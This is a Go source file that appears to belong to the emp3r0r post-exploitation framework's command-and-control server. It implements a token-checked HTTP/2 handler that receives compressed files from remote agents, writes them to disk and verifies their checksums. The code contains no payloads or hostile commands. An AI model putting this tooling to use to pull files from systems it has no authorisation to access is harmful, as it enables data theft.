package ftp

import (
	"context"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archives"
	"github.com/posener/h2conn"
	"github.com/schollz/progressbar/v3"
)

// progressMonitor updates the progress bar.
func progressMonitor(bar *progressbar.ProgressBar, filewrite, targetFile string, targetSize int64) {
	if targetSize == 0 {
		logging.Warningf("progressMonitor: targetSize is 0")
		return
	}
	for {
		var nowSize int64
		if util.IsFileExist(filewrite) {
			nowSize = util.FileSize(filewrite)
		} else {
			nowSize = util.FileSize(targetFile)
		}
		bar.Set64(nowSize)
		state := bar.State()
		logging.Infof("%s: %.2f%% (%d of %d bytes) at %.2fKB/s, %ds passed, %ds left",
			strconv.Quote(targetFile),
			state.CurrentPercent*100, nowSize, targetSize,
			state.KBsPerSecond, int(state.SecondsSince), int(state.SecondsLeft))
		if nowSize >= targetSize || state.CurrentPercent >= 1 {
			break
		}
		time.Sleep(5 * time.Second)
	}
}

// HandleFTPTransfer processes file transfer requests.
func HandleFTPTransfer(sh *network.StreamHandler, wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)
	token := vars["token"]

	// Check connection occupancy and accept connection via H2Conn.
	if sh.H2x != nil && (sh.H2x.Ctx != nil || sh.H2x.Cancel != nil || sh.H2x.Conn != nil) {
		logging.Errorf("handleFTPTransfer: connection occupied")
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}
	var err error
	sh.H2x = &def.H2Conn{}
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		logging.Errorf("handleFTPTransfer: failed connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}
	sh.H2x.Ctx, sh.H2x.Cancel = context.WithCancel(req.Context())
	defer sh.H2x.Conn.Close()
	defer sh.H2x.Cancel()

	// Verify token consistency & extract checksum.
	if token != sh.Token {
		logging.Errorf("Invalid ftp token '%s vs %s'", token, sh.Token)
		return
	}
	logging.Debugf("FTP connection (%s) from %s", sh.Token, req.RemoteAddr)
	tokenSplit := strings.Split(token, "-")
	if len(tokenSplit) != 2 {
		logging.Errorf("Invalid token: %s", token)
		return
	}
	mustHaveChecksum := tokenSplit[1]

	// Determine file paths.
	filename := ""
	for fname, persh := range network.FTPStreams {
		if sh.Token == persh.Token {
			filename = fname
			break
		}
	}
	if filename == "" {
		logging.Errorf("Failed to parse filename for token %s", sh.Token)
		return
	}
	mapKey := filename
	// Prepare file paths. targetFile is the final destination, filewrite is the temp file that we write to, it will be renamed to targetFile when done.
	writeDir, targetFile, filewrite, lock := GenerateGetFilePaths(filename)
	logging.Debugf("Downloading to %s, saving to %s, using lock file %s", filewrite, targetFile, lock)
	if !util.IsDirExist(writeDir) {
		logging.Debugf("Creating directory: %s", writeDir)
		err = os.MkdirAll(writeDir, 0o700)
		if err != nil {
			logging.Errorf("Mkdir %s: %v", writeDir, err)
			return
		}
	}
	if util.IsExist(lock) {
		logging.Errorf("%s is already being downloaded", filename)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}
	_, err = os.Create(lock)
	if err != nil {
		logging.Errorf("Create lock file error: %v", err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	if !util.IsExist(live.FileGetDir) {
		err = os.MkdirAll(live.FileGetDir, 0o700)
		if err != nil {
			logging.Errorf("Mkdir FileGetDir %s: %v", live.FileGetDir, err)
			return
		}
	}

	// Open file for writing.
	var targetSize, nowSize int64
	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0o600)
	if err != nil {
		logging.Errorf("Open file error: %v", err)
		return
	}
	defer f.Close()
	logging.Debugf("Writing to file %s", filewrite)

	// Initialize progress bar.
	targetSize = util.FileSize(targetFile)
	nowSize = util.FileSize(filewrite)
	bar := progressbar.DefaultBytesSilent(targetSize)
	bar.Add64(nowSize)
	defer bar.Close()
	logging.Debugf("Initial sizes: target %d, current %d", targetSize, nowSize)
	go progressMonitor(bar, filewrite, targetFile, targetSize)

	// On-exit cleanup.
	cleanup := func() {
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				logging.Errorf("Failed to close connection: %v", err)
			}
		}
		sh.H2x.Cancel()
		network.FTPMutex.Lock()
		delete(network.FTPStreams, mapKey)
		network.FTPMutex.Unlock()
		logging.Warningf("Closed FTP connection from %s", req.RemoteAddr)
		err = os.Remove(lock)
		if err != nil {
			logging.Warningf("Remove lock %s: %v", lock, err)
		}
		nowSize = util.FileSize(filewrite)
		targetSize = util.FileSize(targetFile)
		if nowSize == targetSize && nowSize >= 0 {
			err = os.Rename(filewrite, targetFile)
			if err != nil {
				logging.Errorf("Rename file error %s: %v", targetFile, err)
			}
			checksum := crypto.SHA256SumFile(targetFile)
			if checksum == mustHaveChecksum {
				logging.Successf("Downloaded %d bytes to %s (%s)", nowSize, targetFile, checksum)
				return
			}
			logging.Errorf("%s downloaded but checksum mismatch: %s vs %s", targetFile, checksum, mustHaveChecksum)
			return
		}
		if nowSize > targetSize {
			logging.Errorf("%s: downloaded (%d of %d bytes), error", targetFile, nowSize, targetSize)
			return
		}
		logging.Warningf("Incomplete download: %.4f%% (%d of %d bytes)", float64(nowSize)*100/float64(targetSize), nowSize, targetSize)
	}
	defer cleanup()

	// Decompress and write file data.
	decompressor, err := archives.Zstd{}.OpenReader(sh.H2x.Conn)
	if err != nil {
		logging.Errorf("Open decompressor error: %v", err)
		return
	}
	defer decompressor.Close()
	n, err := io.Copy(f, decompressor)
	if err != nil {
		logging.Warningf("Saving file failed after %d bytes: %v", n, err)
		return
	}
}
